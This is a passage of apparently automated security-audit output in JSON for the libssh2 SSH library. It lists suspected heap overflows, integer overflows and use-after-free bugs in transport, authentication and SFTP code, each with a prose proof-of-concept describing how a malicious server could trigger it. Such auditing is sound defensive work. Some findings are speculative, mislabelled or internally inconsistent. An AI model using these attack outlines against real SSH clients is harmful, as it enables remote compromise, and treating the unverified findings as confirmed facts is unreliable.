+      "file": "libssh2/transport.c [_libssh2_transport_read B: padding+seq L467-569]",
+      "chars": 4409,
+      "elapsed_s": 92.3,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Untrusted length from get_len callback stored without validation",
+          "line_start": 547,
+          "confidence": 0.85,
+          "description": "The `session->remote.crypt->get_len` callback returns a `len` value (unsigned int) extracted from network data. After a successful return (rc == LIBSSH2_ERROR_NONE), this `len` is stored into `block` via `_libssh2_store_u32` without any bounds validation. Per RFC 4253, SSH packet length must be <= 35000 bytes. An attacker (MITM) can craft a packet with a malicious length field that, when decrypted by `get_len`, returns an extremely large value (e.g., 0xFFFFFFFF). This untrusted `len` will later be used to compute `total_num` (total packet size = len + padding_length + mac_length), which can integer-overflow on 32-bit size_t platforms or cause an undersized heap allocation followed by a heap buffer overflow when the packet payload is copied. This matches the pattern of CVE-2019-3855/CVE-2019-3856 in libssh2.",
+          "poc": "An attacker positioned as a MITM can inject a crafted SSH packet where the encrypted length field, once decrypted by the get_len callback, yields a value such as 0xFFFFFFFF. When this value is used in subsequent arithmetic (e.g., total_num = len + 1 + padding + mac_size), integer overflow produces a small allocation size, while the actual data written exceeds the buffer, causing heap corruption. For chacha20-poly1305 or AES-GCM ciphers that use get_len, the length field is encrypted but the cipher's get_len implementation may not enforce RFC bounds on the decrypted value."
+        },
+        {
+          "severity": "high",
+          "title": "Unauthenticated packet length used before MAC verification in encrypt-then-MAC mode",
+          "line_start": 537,
+          "confidence": 0.75,
+          "description": "In encrypt-then-MAC (etm) mode, the 4-byte packet length field is NOT encrypted — it is copied directly from the network buffer into both `block` and `p->init` via memcpy. While the MAC does authenticate this length field, the MAC verification occurs later in the packet processing pipeline. The unauthenticated length is used immediately to determine how much data to read and potentially allocate memory for. An attacker can inject a crafted large length value (up to 0xFFFFFFFF) in a modified packet, causing the code to attempt to read/allocate an enormous amount of data before the MAC mismatch is detected. This leads to denial of service (excessive memory allocation or CPU consumption) and potentially to integer overflow in subsequent size calculations.",
+          "poc": "In etm mode, an attacker intercepts traffic and replaces the 4-byte plaintext length field with 0x00FFFFFF (~16MB). The code copies this into block/init and uses it to compute total_num and allocate a payload buffer of that size. The MAC check will eventually fail, but only after the large allocation has already occurred. Repeated attacks exhaust server memory. A more carefully chosen length could cause integer overflow in total_num computation (len + 1 + padding + mac), leading to heap buffer overflow."
+        },
+        {
+          "severity": "medium",
+          "title": "Potential buffer over-read if get_len returns len > numbytes",
+          "line_start": 547,
+          "confidence": 0.6,
+          "description": "The `get_len` callback is passed `numbytes` (the amount of data available in the buffer) but there is no verification that the returned `len` value does not exceed `numbytes`. If a buggy or compromised `get_len` implementation returns a `len` larger than the available data, subsequent code that reads `len` bytes from `p->buf[p->readidx]` will read beyond the buffer boundary. Even in non-compromised scenarios, if the cipher's `get_len` implementation doesn't properly validate the decrypted length against available data, this creates an information disclosure or crash vector.",
+          "poc": "Craft an SSH packet where the encrypted length field decrypts to a value larger than the actual data available in the receive buffer. If get_len returns this value without checking against numbytes, subsequent processing will read past the end of p->buf, leaking heap data or causing a segfault."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/transport.c [_libssh2_transport_read C: socket read loop L569-671]",
+      "chars": 4381,
+      "elapsed_s": 265.2,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Integer Overflow in total_num Calculation in REQUIRES_FULL_PACKET Path",
+          "line_start": 625,
+          "confidence": 0.85,
+          "description": "In the REQUIRES_FULL_PACKET code path (the `else` branch when `encrypted && CRYPT_FLAG_R(session, REQUIRES_FULL_PACKET)`), `p->packet_length` is read from the network via `_libssh2_ntohu32(block)` and only validated for `< 1`, but is NOT validated against `LIBSSH2_PACKET_MAXPAYLOAD` — unlike the other code path which explicitly checks `p->packet_length > LIBSSH2_PACKET_MAXPAYLOAD`. The subsequent `total_num` calculation (`total_num = 4 + p->packet_length + (remote_mac ? remote_mac->mac_len : 0) + auth_len`) can integer-overflow, producing a small `total_num` value that passes the final `total_num > LIBSSH2_PACKET_MAXPAYLOAD` check. On 32-bit systems, `size_t` is 32-bit making overflow trivial. On 64-bit systems with AEAD ciphers (e.g., chacha20-poly1305) where `remote_mac` may be NULL, the intermediate expression `p->packet_length + 0 + auth_len` is computed in 32-bit arithmetic before promotion to `size_t`, enabling overflow. For example, `packet_length=0xFFFFFFF0` with `auth_len=16` overflows to 0, yielding `total_num=4`, which passes validation. This can lead to a heap buffer overflow when packet data is subsequently read into an undersized buffer, enabling remote code execution.",
+          "poc": "1. Establish SSH connection negotiating chacha20-poly1305 (sets REQUIRES_FULL_PACKET flag, AEAD with remote_mac=NULL or mac_len=0, auth_len=16)\n2. Send a crafted encrypted packet where the decrypted first block contains packet_length = 0xFFFFFFF0\n3. Computation: total_num = 4; total_num += 0xFFFFFFF0 + 0 + 16 = 4 + 0 (32-bit overflow) = 4\n4. total_num=4 passes both checks (4 <= LIBSSH2_PACKET_MAXPAYLOAD and 4 != 0)\n5. Undersized buffer allocated; subsequent read of actual packet data causes heap buffer overflow"
+        },
+        {
+          "severity": "medium",
+          "title": "Missing packet_length Upper Bound Check in REQUIRES_FULL_PACKET Path",
+          "line_start": 630,
+          "confidence": 0.95,
+          "description": "The non-REQUIRES_FULL_PACKET code path explicitly validates `p->packet_length > LIBSSH2_PACKET_MAXPAYLOAD` before using the value, but the REQUIRES_FULL_PACKET path only checks `p->packet_length < 1`. This inconsistent validation means that even without integer overflow, an attacker-controlled `p->packet_length` value that exceeds LIBSSH2_PACKET_MAXPAYLOAD is used directly in the `total_num` calculation and stored in `p->packet_length` for later use. The only protection is the post-hoc `total_num` check, which is insufficient on platforms where integer overflow can occur. This violates the defense-in-depth principle and is the root cause enabling the integer overflow vulnerability above.",
+          "poc": "Compare the two code paths:\n- Path A (line ~601): `if(p->packet_length > LIBSSH2_PACKET_MAXPAYLOAD) return LIBSSH2_ERROR_OUT_OF_BOUNDARY;`\n- Path B (line ~632): Only `if(p->packet_length < 1) return LIBSSH2_ERROR_DECRYPT;` — no upper bound check.\nA crafted packet with packet_length between LIBSSH2_PACKET_MAXPAYLOAD and UINT32_MAX reaches subsequent code without proper validation in Path B."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/transport.c [_libssh2_transport_read D: payload assemble L671-776]",
+      "chars": 4395,
+      "elapsed_s": 286.5,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer underflow in p->total_num -= 4 leading to heap buffer overflow",
+          "line_start": 737,
+          "confidence": 0.82,
+          "description": "In the REQUIRES_FULL_PACKET code path, `p->total_num` is decremented by 4 without verifying it is >= 4 first. Since `p->total_num` is derived from the SSH packet length field (controlled by a remote peer) and is likely of unsigned type (size_t), a value of 0-3 would cause an integer underflow wrapping to a massive value. This corrupted `p->total_num` is then used in subsequent `remainpack` calculations and buffer operations, leading to a heap buffer overflow. A malicious SSH server or client can craft a packet with a very small packet_length to trigger this.",
+          "poc": "1. Connect to a libssh2 client as a malicious SSH server.\n2. Negotiate a cipher with REQUIRES_FULL_PACKET flag (e.g., ChaCha20-Poly1305).\n3. Send an encrypted packet with packet_length field set to a value < 4 (e.g., 2).\n4. The code allocates a 2-byte buffer, then p->total_num -= 4 underflows to ~0xFFFFFFFFFFFFFFFE.\n5. Subsequent remainpack = p->total_num - p->data_num becomes enormous, causing massive heap overflow when data is copied."
+        },
+        {
+          "severity": "high",
+          "title": "Integer underflow in numbytes -= 4 in REQUIRES_FULL_PACKET path",
+          "line_start": 737,
+          "confidence": 0.75,
+          "description": "In the same REQUIRES_FULL_PACKET code block, `numbytes -= 4` is performed without checking that `numbytes >= 4`. The preceding check only ensures `numbytes >= remainpack` (which equals `p->total_num` when `data_num=0`). If `p->total_num` is small (e.g., 2) and `numbytes` equals `remainpack` (also 2), then `numbytes -= 4` produces a negative value (if ssize_t) or wraps (if unsigned). This corrupted `numbytes` is subsequently used in decryption size calculations and data copy operations, potentially causing out-of-bounds writes.",
+          "poc": "Same setup as the total_num underflow. When numbytes == remainpack == 2, after numbytes -= 4, numbytes becomes -2 (ssize_t). This negative value propagates into numdecrypt calculations and subsequent memcpy/decryption operations, causing heap corruption."
+        },
+        {
+          "severity": "medium",
+          "title": "Dead code: etm check inside !etm conditional indicates logic error",
+          "line_start": 680,
+          "confidence": 0.7,
+          "description": "The inner `if(etm) { p->wptr += 4; }` at line 687-690 is enclosed within `if(!etm && blocksize > 5)` at line 680, making it dead code — it can never execute. The 4-byte wptr advancement was intended to skip the unencrypted packet length field in Encrypt-then-MAC (etm) mode. Its inaccessibility suggests the outer condition should have been `blocksize > 5` (without `!etm`), meaning the etm path may be missing critical buffer pointer advancement. This could cause packet data misalignment in etm mode, where the unencrypted length field is not properly skipped, leading to incorrect decryption and potential buffer boundary violations.",
+          "poc": "Enable etm cipher mode and send a packet. The wptr is never advanced by 4 bytes to skip the unencrypted packet length, so subsequent data is written at an offset 4 bytes earlier than expected, potentially overlapping with or overflowing the payload buffer boundary."
+        },
+        {
+          "severity": "low",
+          "title": "Dead code: !encrypted check inside encrypted-only else branch",
+          "line_start": 712,
+          "confidence": 0.85,
+          "description": "The `if(!encrypted) numbytes -= 4;` at line 712-713 is inside an `else` branch that is only reached when `encrypted && CRYPT_FLAG_R(session, REQUIRES_FULL_PACKET)` is true. Therefore `!encrypted` is always false, making this dead code. The comment says 'we already dealt with packet size worth of data', suggesting `numbytes` should be reduced by 4 to account for the packet length field, but this never happens in this branch. While the later `numbytes -= 4` at line 737 may compensate, the misplaced check indicates a logic error that could lead to incorrect byte accounting if the code is refactored.",
+          "poc": "N/A - dead code path. However, if the outer condition were modified (e.g., during refactoring), the missing numbytes adjustment could cause off-by-4 errors in buffer operations."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/transport.c [_libssh2_transport_read E: MAC check+return L776-900]",
+      "chars": 4609,
+      "elapsed_s": 191.4,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer underflow in bounds check enables heap buffer overflow",
+          "line_start": 839,
+          "confidence": 0.85,
+          "description": "The bounds check on line 839 uses unsigned arithmetic: `(size_t)numbytes <= (p->total_num - (p->wptr - p->payload))`. If `p->wptr` has been advanced past `p->payload + p->total_num` (which can happen due to the REQUIRES_FULL_PACKET path inflating `numdecrypt` by `auth_len` on line 810 before advancing `p->wptr` by the inflated value on line 831), the subtraction `p->total_num - (p->wptr - p->payload)` underflows to a very large size_t value. This causes the bounds check to always pass, and the subsequent `memcpy(p->wptr, &p->buf[p->readidx], numbytes)` on line 841 writes past the end of the allocated heap buffer. A malicious SSH server negotiating an AEAD cipher (e.g., AES-GCM, ChaCha20-Poly1305) can craft packets that trigger this condition, leading to remote code execution on the client.",
+          "poc": "1. Set up a malicious SSH server that negotiates an AEAD cipher (REQUIRES_FULL_PACKET flag set).\n2. Send a crafted SSH packet where the encrypted payload size plus auth_len causes `numdecrypt + auth_len` to exceed the expected data written to `p->wptr`.\n3. This causes `p->wptr` to advance past `p->payload + p->total_num` on line 831.\n4. On the next iteration, the bounds check on line 839 underflows, and the memcpy on line 841 writes out-of-bounds heap data.\n5. The overflow can corrupt heap metadata and lead to arbitrary code execution."
+        },
+        {
+          "severity": "high",
+          "title": "Mismatched wptr advancement in REQUIRES_FULL_PACKET path inflates data_num",
+          "line_start": 810,
+          "confidence": 0.8,
+          "description": "In the REQUIRES_FULL_PACKET code path, `numdecrypt` is increased by `auth_len` on line 810 to account for the authentication tag. However, this inflated `numdecrypt` is then used to advance `p->wptr` (line 831) and `p->data_num` (line 832), even though only `numbytes` bytes were actually written to `p->wptr` via the memcpy on line 804. This creates a gap of `auth_len` uninitialized bytes in the payload buffer and causes `p->data_num` to be larger than the actual data written. The inflated `p->data_num` causes `remainpack = p->total_num - p->data_num` (line 855) to be smaller than expected, potentially causing the packet to be considered complete prematurely with incomplete/corrupted data, leading to further memory safety issues downstream.",
+          "poc": "1. Connect to a malicious SSH server that negotiates an AEAD cipher with a non-zero auth_len (e.g., 16 bytes for AES-GCM).\n2. The server sends a packet where the REQUIRES_FULL_PACKET path is taken.\n3. After decryption, numdecrypt is inflated by auth_len (16), but only numbytes were copied to p->wptr.\n4. p->wptr advances 16 bytes past the last written byte, and p->data_num is inflated by 16.\n5. remainpack becomes 16 bytes smaller than expected, causing fullpacket() to be called with p->wptr pointing to uninitialized memory and p->data_num being incorrect."
+        },
+        {
+          "severity": "medium",
+          "title": "Dangling pointer after free on out-of-boundary error path",
+          "line_start": 846,
+          "confidence": 0.65,
+          "description": "When the bounds check on line 839 fails, `p->payload` is freed via `LIBSSH2_FREE(session, p->payload)` on line 847, but `p->payload` is not set to NULL afterward. If the caller or any cleanup path subsequently accesses `p->payload` without checking the error code properly, it results in a use-after-free. While the function returns `LIBSSH2_ERROR_OUT_OF_BOUNDARY` immediately, libssh2 has retry patterns (e.g., for EAGAIN) where state may not be fully reset, potentially leading to dangling pointer access on re-entry or during session cleanup.",
+          "poc": "1. Trigger the out-of-boundary condition by sending a malformed packet.\n2. p->payload is freed but p->payload still holds the old address.\n3. If session cleanup or a retry path accesses p->payload without null-checking, a use-after-free occurs.\n4. This can be triggered reliably by causing the error and then immediately closing the session, which may access p->payload during cleanup."
+        },
+        {
+          "severity": "high",
+          "title": "Missing bounds check before memcpy in REQUIRES_FULL_PACKET path",
+          "line_start": 804,
+          "confidence": 0.7,
+          "description": "The memcpy on line 804 (`memcpy(p->wptr, &p->buf[p->readidx], numbytes)`) in the REQUIRES_FULL_PACKET path has no bounds check to verify that `numbytes` bytes fit within the remaining space at `p->wptr`. In contrast, the similar memcpy for non-decrypted bytes on line 841 is guarded by a bounds check on line 839. If `numbytes` is larger than the available space at `p->wptr` (i.e., `p->total_num - (p->wptr - p->payload)`), this memcpy writes past the end of the payload buffer, causing a heap buffer overflow. A malicious server could craft a packet where `numbytes` exceeds the allocated buffer size.",
+          "poc": "1. Negotiate an AEAD cipher with a malicious SSH server.\n2. Send a packet where numbytes (calculated from available buffer data) exceeds the remaining space in the payload buffer at p->wptr.\n3. The unchecked memcpy on line 804 overflows the heap buffer.\n4. Heap corruption leads to potential code execution."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/userauth.c [userauth_list A: send+recv parse L67-154]",
+      "chars": 3787,
+      "elapsed_s": 74.2,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer Overflow in userauth_list leading to Heap Buffer Overflow",
+          "line_start": 83,
+          "confidence": 1.0,
+          "description": "An integer overflow vulnerability exists in the calculation of the packet length. The variable `username_len` (of type `unsigned int`) is added to 27 to determine `session->userauth_list_data_len`. If an attacker controls or influences `username_len` to be a value close to UINT_MAX (e.g., 0xFFFFFFE6), the addition wraps around to a small value (e.g., 1). Consequently, a small buffer is allocated by LIBSSH2_ALLOC. Subsequently, `_libssh2_store_str` copies `username_len` bytes from `username` into this undersized buffer, resulting in a massive heap-based buffer overflow. This can lead to remote code execution or denial of service. This corresponds to CVE-2019-3856.",
+          "poc": "Invoke libssh2_userauth_list() with a valid session, a pointer to a memory region for the username, and a username_len of 0xFFFFFFE6. The integer overflow on `username_len + 27` will result in a small allocation (e.g., 1 byte), while `_libssh2_store_str` attempts to write 0xFFFFFFE6 bytes, causing a heap overflow and likely a crash or arbitrary code execution depending on heap layout."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/userauth.c [userauth_list B: method string parse L154-229]",
+      "chars": 3453,
+      "elapsed_s": 360.4,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/userauth.c [keyboard_interactive A: request send L293-382]",
+      "chars": 3779,
+      "elapsed_s": 46.5,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer Overflow in userauth_pswd_data_len Calculation Leading to Heap Buffer Overflow",
+          "line_start": 307,
+          "confidence": 0.85,
+          "description": "The calculation `session->userauth_pswd_data_len = username_len + 40` is susceptible to an integer overflow. If `username_len` is a value close to the maximum of its unsigned type (e.g., 0xFFFFFFD8 for 32-bit unsigned int), adding 40 wraps around to a small value. The subsequent LIBSSH2_ALLOC allocates a tiny buffer, but `_libssh2_store_str(&s, username, username_len)` writes `4 + username_len` bytes into it, causing a massive heap buffer overflow. This can lead to arbitrary code execution.",
+          "poc": "Call the function with username_len = 0xFFFFFFD8 (on 32-bit) or 0xFFFFFFFFFFFFFFD8 (on 64-bit). The addition username_len + 40 wraps to 0 (or a small number). LIBSSH2_ALLOC allocates a near-zero-size buffer. _libssh2_store_str then attempts to write ~4GB of data from the username pointer into the tiny heap buffer, corrupting heap metadata and adjacent allocations."
+        },
+        {
+          "severity": "medium",
+          "title": "Dual-Purpose Reuse of userauth_pswd_data Pointer (Outgoing Request vs Incoming Response)",
+          "line_start": 312,
+          "confidence": 0.55,
+          "description": "The `session->userauth_pswd_data` pointer is used for two distinct purposes: first as the outgoing authentication request packet (allocated at line 312, freed at line 347), and then reused by `_libssh2_packet_requirev` at line 367 to store the incoming response data. While the pointer is set to NULL after freeing, the state machine (with the `password_response` label and multiple NB states) could lead to confusing control flow where stale state causes the pointer to be used incorrectly. If an error path or re-entry via the `password_response` goto label causes the freed pointer to be accessed before `_libssh2_packet_requirev` reassigns it, a use-after-free could occur.",
+          "poc": "Trigger a scenario where the function is re-entered at the `password_response` label (e.g., via SSH_MSG_USERAUTH_PASSWD_CHANGEREQ handling) with a corrupted or unexpected state, causing session->userauth_pswd_data (which was freed and set to NULL) to be dereferenced before _libssh2_packet_requirev assigns a new buffer. A NULL dereference crash would be the minimal impact; more complex scenarios could exploit heap reuse."
+        },
+        {
+          "severity": "medium",
+          "title": "Insufficient Validation of Response Data Length After _libssh2_packet_requirev",
+          "line_start": 380,
+          "confidence": 0.6,
+          "description": "The code checks `session->userauth_pswd_data_len < 1` after receiving the response, but this only verifies at least 1 byte exists (the message type). Subsequent parsing of the response (beyond the visible code) likely reads additional fields (e.g., failure flags, password change prompts) without adequate bounds checking. A malicious SSH server could send a truncated response packet, causing out-of-bounds reads when the client parses fields beyond the actual packet length.",
+          "poc": "A malicious SSH server responds to the SSH_MSG_USERAUTH_REQUEST with a packet containing only the message type byte (SSH_MSG_USERAUTH_FAILURE = 51) and no additional data. The check `data_len < 1` passes (data_len == 1), but subsequent code that parses partial success flags or auth method strings reads beyond the 1-byte buffer."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/userauth.c [keyboard_interactive B: prompt recv+count L382-455]",
+      "chars": 3765,
+      "elapsed_s": 68.1,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Heap Buffer Overflow due to Missing newpw_len in Allocation Size",
+          "line_start": 449,
+          "confidence": 0.95,
+          "description": "When handling SSH_MSG_USERAUTH_PASSWD_CHANGEREQ, the buffer is allocated with size `username_len + password_len + 44`, but this calculation does NOT include `session->userauth_pswd_newpw_len` — the length of the new password returned by the callback. The comment 'basic data_len + newpw_len(4)' confirms that only 4 bytes for the length prefix of newpw are accounted for, not the actual new password data. When the new password is subsequently written into this buffer, a heap buffer overflow occurs. A malicious SSH server can trigger this by sending a PASSWD_CHANGEREQ message, causing the client callback to supply a new password that overflows the undersized heap allocation.",
+          "poc": "1. Set up a malicious SSH server that responds to password authentication with SSH_MSG_USERAUTH_PASSWD_CHANGEREQ. 2. The client's passwd_change_cb returns a new password (e.g., 256 bytes). 3. The buffer is allocated as username_len + password_len + 44 (e.g., ~100 bytes). 4. Writing the 256-byte new password into the ~100-byte buffer causes heap corruption. Exploit: craft server response with PASSWD_CHANGEREQ, client callback returns long newpw, heap overflow triggers code execution."
+        },
+        {
+          "severity": "high",
+          "title": "Integer Overflow in Buffer Size Calculation",
+          "line_start": 449,
+          "confidence": 0.8,
+          "description": "The overflow check `username_len + password_len + 44 <= UINT_MAX` is insufficient. If `username_len` and `password_len` are of type `unsigned int`, the expression `username_len + password_len + 44` can itself wrap around to a small value before the comparison. The wrapped value would be <= UINT_MAX, so the check passes, but `session->userauth_pswd_data_len` receives the truncated (small) value. A small buffer is then allocated, but the full-sized data is written, causing a heap buffer overflow. Even if the types are size_t on 64-bit, the assignment to userauth_pswd_data_len (likely uint32_t) could truncate.",
+          "poc": "Provide username_len and password_len values such that their sum plus 44 exceeds UINT_MAX (e.g., username_len = 0x80000000, password_len = 0x80000000). The addition wraps to a small value (~43), the check passes, a tiny buffer is allocated, and the subsequent writes overflow the heap."
+        },
+        {
+          "severity": "medium",
+          "title": "Type Confusion via Stale userauth_pswd_data0 Field",
+          "line_start": 428,
+          "confidence": 0.7,
+          "description": "The condition at line 428-431 checks both `session->userauth_pswd_data[0]` (the actual received message type) and `session->userauth_pswd_data0` (a cached/stored message type from a previous iteration). If `userauth_pswd_data0` was set to SSH_MSG_USERAUTH_PASSWD_CHANGEREQ in a prior round but the server sends a different message type in the current response, the code still enters the password-change handling path. This stale field allows a malicious server to force the client to misinterpret a non-CHANGEREQ response as a password change request, potentially leading to incorrect authentication state handling.",
+          "poc": "1. Server sends PASSWD_CHANGEREQ, setting userauth_pswd_data0. 2. Client enters callback, state advances to sent2. 3. On re-entry, server sends a different message type (e.g., SSH_MSG_USERAUTH_FAILURE). 4. The check `session->userauth_pswd_data0 == SSH_MSG_USERAUTH_PASSWD_CHANGEREQ` is true, so the code incorrectly processes the FAILURE message as a CHANGEREQ."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/userauth.c [keyboard_interactive C: response send L455-540]",
+      "chars": 4184,
+      "elapsed_s": 360.4,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/userauth.c [libssh2_sign_sk: sk key signing L905-1001]",
+      "chars": 3212,
+      "elapsed_s": 360.4,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/userauth.c [publickey_auth A: trial+build L1014-1099]",
+      "chars": 3942,
+      "elapsed_s": 138.9,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Integer Overflow in Packet Length Calculation Leading to Heap Buffer Overflow",
+          "line_start": 1053,
+          "confidence": 0.85,
+          "description": "The packet length is computed as the sum of multiple attacker-influenced size_t values: username_len + userauth_host_method_len + hostname_len + local_username_len + pubkeydata_len + 52. On 32-bit platforms, this sum can overflow, wrapping around to a small value. The subsequent LIBSSH2_ALLOC uses this overflowed value, resulting in an undersized heap buffer. The _libssh2_store_str calls then write data based on the original (non-overflowed) lengths, causing a heap buffer overflow. No bounds checking is performed before the addition. The secondary allocation expression (userauth_host_packet_len + 4 + (4 + method_len) + (4 + pubkeydata_len)) can also overflow independently.",
+          "poc": "On a 32-bit system, craft inputs where username_len=0x40000000, hostname_len=0x40000000, local_username_len=0x40000000, and pubkeydata_len=0x40000000. The sum overflows size_t, wrapping to a small value (~52). The allocation is tiny, but _libssh2_store_str writes gigabytes of data, causing heap corruption and potential RCE."
+        },
+        {
+          "severity": "high",
+          "title": "Insufficient Buffer Allocation for Ed25519 Signature (Incorrect Size Assumption)",
+          "line_start": 1064,
+          "confidence": 0.8,
+          "description": "The comment states the signature 'won't be any larger than the size of the publickeydata itself', and the allocation reserves only (4 + pubkeydata_len) bytes for the signature. This assumption is WRONG for Ed25519 keys. An Ed25519 public key blob is ~51 bytes (4+11+4+32), but its SSH-encoded signature is ~83 bytes (4+11+4+64). The signature is 32 bytes larger than the public key data. When the signature is later written into the preallocated buffer, it overflows by approximately 32 bytes, corrupting adjacent heap metadata/data. This affects all platforms regardless of pointer width.",
+          "poc": "Use an Ed25519 key pair for hostbased authentication. The public key blob (pubkeydata) is 51 bytes. The allocation reserves 4+51=55 bytes for the signature. The actual Ed25519 signature encoding is 83 bytes (4-byte len + 'ssh-ed25519' + 4-byte len + 64-byte sig). Writing 83 bytes into 55 bytes of space causes a 28-byte heap overflow, potentially leading to code execution."
+        },
+        {
+          "severity": "medium",
+          "title": "Secondary Integer Overflow in Signature Preallocation Expression",
+          "line_start": 1064,
+          "confidence": 0.7,
+          "description": "The total allocation size is computed as: userauth_host_packet_len + 4 + (4 + userauth_host_method_len) + (4 + pubkeydata_len). Even if userauth_host_packet_len is correctly computed, this additional sum can independently overflow size_t on 32-bit platforms, since userauth_host_method_len and pubkeydata_len are added again. This could result in a smaller-than-expected allocation even when the primary packet_len calculation doesn't overflow.",
+          "poc": "On a 32-bit system, if userauth_host_packet_len is near SIZE_MAX/2 and method_len + pubkeydata_len is also large, the total allocation expression wraps around, allocating a tiny buffer while the code writes a large amount of data."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/userauth.c [publickey_auth B: sign+send L1099-1181]",
+      "chars": 3795,
+      "elapsed_s": 184.2,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Integer Overflow in REALLOC Size Calculation Leading to Heap Buffer Overflow",
+          "line_start": 1143,
+          "confidence": 0.85,
+          "description": "The size calculation for LIBSSH2_REALLOC can overflow on 32-bit platforms when sig_len is very large. The expression `session->userauth_host_packet_len + 4 + (4 + session->userauth_host_method_len) + (4 + sig_len)` can wrap around to a small value if sig_len is close to SIZE_MAX. This results in a small heap allocation, after which _libssh2_store_str writes sig_len bytes of signature data into the undersized buffer, causing a heap buffer overflow. The sig_len value comes from the privkeyobj->signv() callback with no upper-bound validation. While built-in signing callbacks return reasonable sizes, a custom or compromised callback could return an arbitrarily large sig_len, triggering this overflow.",
+          "poc": "On a 32-bit system, register a custom hostkey with a signv callback that sets sig_len to a value like 0xFFFFFFF0 and sig to a valid pointer to a small buffer. The REALLOC size calculation wraps: packet_len(~200) + 4 + (4 + method_len(~10)) + (4 + 0xFFFFFFF0) ≈ 0x000000C2 (small value). A small buffer is allocated, then _libssh2_store_str attempts to memcpy 0xFFFFFFF0 bytes, causing heap corruption and potential RCE."
+        },
+        {
+          "severity": "info",
+          "title": "uint32_t Truncation of Signature Blob Length in Packet",
+          "line_start": 1160,
+          "confidence": 0.7,
+          "description": "The _libssh2_store_u32 call casts the signature blob length to uint32_t: `(uint32_t)(4 + session->userauth_host_method_len + 4 + sig_len)`. If the sum exceeds 2^32, the stored length is silently truncated while the actual data written (_libssh2_store_str calls) uses the full sig_len. This creates a length/value inconsistency in the SSH packet: the server reads the truncated length and misinterprets the packet boundary, potentially reading beyond the intended signature data or misparsing subsequent fields. This could lead to server-side packet parsing errors or information disclosure.",
+          "poc": "If sig_len = 0x100000000 (4GB+1) and method_len = 10, the actual data written is 8 + 10 + 0x100000000 bytes, but the stored length field reads as (uint32_t)(4+10+4+0x100000000) = 0x00000012 (18 bytes). The SSH server would only read 18 bytes of signature data, misaligning the packet stream."
+        },
+        {
+          "severity": "info",
+          "title": "Missing Validation of sig_len from signv Callback",
+          "line_start": 1115,
+          "confidence": 0.9,
+          "description": "After the privkeyobj->signv() callback returns, sig_len is used directly in size calculations and memory operations without any bounds checking. There is no validation that sig_len is reasonable (e.g., non-zero, within expected bounds for the key algorithm, or not exceeding SIZE_MAX - existing_packet_size). This missing validation is the root cause enabling the integer overflow and heap buffer overflow described above. A defensive check such as `if(sig_len > MAX_SIG_LEN || sig_len > SIZE_MAX - session->userauth_host_packet_len - 12 - session->userauth_host_method_len)` would prevent exploitation.",
+          "poc": "Any custom signv implementation returning an unexpectedly large sig_len triggers the vulnerability chain. For example, an ED25519 key callback that erroneously returns sig_len = 0xFFFFFFFF due to a bug or memory corruption would bypass the `sig_len > pubkeydata_len` check and trigger the integer overflow in REALLOC."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/sftp.c [sftp_packet_add A: length check+alloc L173-302]",
+      "chars": 3945,
+      "elapsed_s": 76.1,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "medium",
+          "title": "Memory Leak on Allocation Failure in sftp_packet_add",
+          "line_start": 285,
+          "confidence": 0.92,
+          "description": "When LIBSSH2_ALLOC fails to allocate memory for the LIBSSH2_SFTP_PACKET structure, the function returns an error without freeing the 'data' buffer that was passed in. Based on the zombie request handling code path (which explicitly calls LIBSSH2_FREE(session, data)), sftp_packet_add takes ownership of the data buffer. On the allocation failure path, this ownership is violated — data is neither freed nor stored, causing a memory leak. An attacker who can trigger repeated allocation failures (e.g., by sending many SFTP packets to exhaust memory) can cause unbounded memory leakage, leading to denial of service.",
+          "poc": "1. Open an SFTP session to a malicious server or act as a MITM. 2. Send a large volume of valid SFTP packets to consume heap memory. 3. As memory becomes scarce, LIBSSH2_ALLOC will begin failing. 4. Each failed allocation in sftp_packet_add leaks the 'data' buffer (which was already allocated by the caller). 5. The leaked memory further exacerbates memory pressure, creating a feedback loop that accelerates OOM conditions."
+        },
+        {
+          "severity": "high",
+          "title": "Potential Integer Overflow in sftp_packet_read Length Handling",
+          "line_start": 305,
+          "confidence": 0.65,
+          "description": "The sftp_packet_read function reads a 32-bit length field from the channel (visible at the cut-off line: 'rc = _libssh2_channel_read(channel, 0,'). This length field, sourced from the network, is used to allocate the packet buffer and determine how much data to read. If the length value is near UINT32_MAX (e.g., 0xFFFFFFFF) and the code computes an allocation size as 'length + header_size' without overflow checking, the result wraps around to a small value. A small buffer is allocated, but the subsequent read attempts to fill 'length' bytes, causing a heap buffer overflow. The partial packet state machine (partial_len, partial_received) also uses these values, compounding the risk. While the full code is truncated, this is a well-documented vulnerability pattern in SFTP implementations including prior libssh2 CVEs (e.g., CVE-2019-17498).",
+          "poc": "1. Act as a malicious SFTP server or MITM on the SSH channel. 2. When the client calls sftp_packet_read, send a crafted SFTP packet with the 32-bit length field set to 0xFFFFFFFF. 3. If the allocation computes 'length + 4' (for the length field itself), this overflows to 3, causing a tiny allocation. 4. The subsequent channel read writes far beyond the allocated buffer, corrupting heap metadata and adjacent objects. 5. This can lead to arbitrary code execution."
+        },
+        {
+          "severity": "low",
+          "title": "Insufficient Packet Content Validation in sftp_packet_add",
+          "line_start": 173,
+          "confidence": 0.7,
